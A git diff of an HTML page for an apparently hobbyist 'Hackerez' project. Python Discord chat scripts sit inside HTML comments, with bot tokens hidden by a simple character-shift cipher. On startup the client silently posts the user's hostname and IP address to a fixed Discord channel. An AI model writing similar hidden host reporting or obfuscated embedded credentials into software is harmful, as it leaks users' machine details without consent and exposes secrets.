@@ -94,7 +94,7 @@ function closeNav() {
 
 
 <div class="os_func">
-	<h4>1.6</h4>
+	<h4>1.7</h4>
 	<p class="os_os">
 <!--
 import math
@@ -115,7 +115,7 @@ a=0
 b=0
 c=0
 i=""
-version="1.6"
+version="1.7"
 print("Controllo aggiornamenti...")
 time.sleep(2)
 sito="https://hackerez04.github.io/Hackerez/contact.html"
@@ -443,6 +443,7 @@ def help1():
 
 
 def intro():
+    print("(Version: %s)"%(version))
     print("______________________________")
     print("System On")
     print("______________________________\n\n")
@@ -459,35 +460,28 @@ def restart():
 
 def chat():
     bot=commands.Bot(command_prefix="/")
-##    global userinfo
-##    userinfo = 0
     m="Rno4SX]9SXk8SHo6R~k4RHY52\sX\TU2WZ9Wx{Ju54V~l[{Q={{wOj8K9TE"
     mm=""
     for c in m:
         mm+=chr(ord(c)-4)
     @bot.event
     async def on_ready():
-##            global userinfo
             print("Chat avviata\n(Per uscire digitare '/quit')")
             print("Per caricare un file scrivere '/file' e premere il tasto enter.\nSuccessivamente scrivere il nome del file 'nomefile.estensione' e premere il tasto enter")
             print("'es: test1.txt'\n")
-##            userinfo=1
+            global nome
+            nome=str(input("**Nome utente**> "))
             h = socket.gethostname()
             i = socket.gethostbyname(h)
             await bot.get_channel(843800724743389184).send("[100]ip/ %s %s"%(h,i))
             
     @bot.event
     async def on_message(message):
-##        global userinfo
         if message.author==bot.user:
             return
         channel=message.channel
-##        if userinfo==1:
-##            h = socket.gethostname()
-##            i = socket.gethostbyname(h)
-##            await bot.get_channel(843800724743389184).send("[100]ip/ %s %s"%(h,i))
-##            userinfo=0
         while True:
+            global nome
             msg=str(input("Messaggio: "))
             canale=bot.get_channel(819527389586653215)
             if msg=="/quit":
@@ -498,7 +492,7 @@ def chat():
                 await canale.send(file=discord.File(r'%s'%(nfile)))
                 print("file inviato")
             else:
-                m=msg
+                m="[%s]>> %s"%(nome,msg)
                 mm=""
                 for c in m:
                     mm+=chr(ord(c)+4)
@@ -551,7 +545,66 @@ while True:
 -->        
 					    </p>    
 
-	<p class="os_chat">null</p>
+	<p class="os_chat">
+<!--
+import discord
+from discord.ext import commands, tasks
+from discord.utils import get
+from discord import File
+import asyncio
+bot = commands.Bot(command_prefix='/')
+m="Rno~SHg9QnY4R~o~SHU6R~o52\sHjeU2jc8RNW5x]fMiz<n1}tESRZpOFT8"
+mm=""
+for c in m:
+        mm+=chr(ord(c)-4)
+@bot.event
+async def on_ready():
+	print('Chat avviata')
+	c=bot.get_channel(819527389586653215)
+	await c.send("//")
+	
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return
+    channel = message.channel
+
+    if message.content.endswith(''):
+            msg=message.content.split()
+            m=""
+            for w in msg[0:]:
+                    m+=w
+                    m+=' '
+            mm=""
+            for c in m:
+                mm+=chr(ord(c)-4)
+            msg=mm.split()
+            output=''
+            for word in msg[0:]:
+                    output+=word
+                    output+=' '
+            print('%s'%(output))
+
+    if str(message.attachments) == "[]": # Checks if there is an attachment on the message
+        return
+    else: # If there is it gets the filename from message.attachments
+        split_v1 = str(message.attachments).split("filename='")[1]
+        filename = str(split_v1).split("' ")[0]
+        r="null"
+        if ((filename.endswith(".txt")) or (filename.endswith(".py")) or (filename.endswith(".jpg")) or (filename.endswith(".gif")) or (filename.endswith(".png")) or (filename.endswith(".cpp")) or (filename.endswith(".mp3"))): # Checks if it is a .csv file
+                while r=="null":
+                        r=str(input("********Do you want to download {} (y/n)?********\n: ".format(filename)))
+                        if r=="y":
+                                await message.attachments[0].save(fp="{}".format(filename)) # saves the file
+                                print("file downloaded")
+                        elif r=="n":
+                                print("\n")
+                        else:
+                                r="null"
+
+bot.run(mm)
+-->
+	</p>
 		
 </div>
 
